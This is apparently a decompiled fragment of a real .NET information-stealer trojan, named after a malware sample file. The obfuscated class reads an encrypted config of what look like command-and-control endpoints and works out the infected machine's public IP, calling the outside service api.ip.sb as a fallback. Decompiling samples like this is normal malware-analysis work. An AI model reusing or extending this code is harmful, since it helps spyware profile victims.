// Decompiled with JetBrains decompiler
// Type: dnlibDotNetFnPtrSigb
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;

public static class dnlibDotNetFnPtrSigb
{
  private static bool IsLocalIp(IPAddress ip)
  {
    int[] array = ((IEnumerable<string>) ip.ToString().Split(new string[1]
    {
      "."
    }, StringSplitOptions.RemoveEmptyEntries)).Select<string, int>(new Func<string, int>(int.Parse)).ToArray<int>();
    return array[0] == 192 && array[1] == 168 || array[0] == 172 && array[1] >= 16 && array[1] <= 31 || array[0] == 10;
  }

  public static string GetDefaultIPv4Address()
  {
    try
    {
      if (((IEnumerable<string>) SystemNetSSPIWrapperX.Read(dnlibDotNetEmitLocalListA.IP, dnlibDotNetEmitLocalListA.Key).Split(new string[1]
      {
        "|"
      }, StringSplitOptions.RemoveEmptyEntries)).Any<string>((Func<string, bool>) (x =>
      {
        if (x.Split(':')[1] == "80")
          return true;
        return x.Split(':')[1] == "81";
      })))
      {
        foreach (UnicastIPAddressInformation unicastAddress in ((IEnumerable<NetworkInterface>) NetworkInterface.GetAllNetworkInterfaces()).Where<NetworkInterface>((Func<NetworkInterface, bool>) (adapter => adapter.OperationalStatus == OperationalStatus.Up && adapter.Supports(NetworkInterfaceComponent.IPv4) && adapter.GetIPProperties().GatewayAddresses.Count > 0 && adapter.GetIPProperties().GatewayAddresses[0].Address.ToString() != "0.0.0.0")).First<NetworkInterface>().GetIPProperties().UnicastAddresses)
        {
          if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && !dnlibDotNetFnPtrSigb.IsLocalIp(unicastAddress.Address) && !IPAddress.IsLoopback(unicastAddress.Address))
            return unicastAddress.Address.ToString();
        }
        return dnlibDotNetFnPtrSigb.Request("https://api.ip.sb/ip", 15000);
      }
    }
    catch (Exception ex)
    {
    }
    return "UNKNOWN";
  }

  private static string Request(string uri, int timeout)
  {
    try
    {
      WebRequest webRequest = WebRequest.Create(uri);
      webRequest.Timeout = timeout;
      using (Stream responseStream = webRequest.GetResponse().GetResponseStream())
      {
        using (StreamReader streamReader = new StreamReader(responseStream))
          return streamReader.ReadToEnd().Trim();
      }
    }
    catch (Exception ex)
    {
      return (string) null;
    }
  }
}
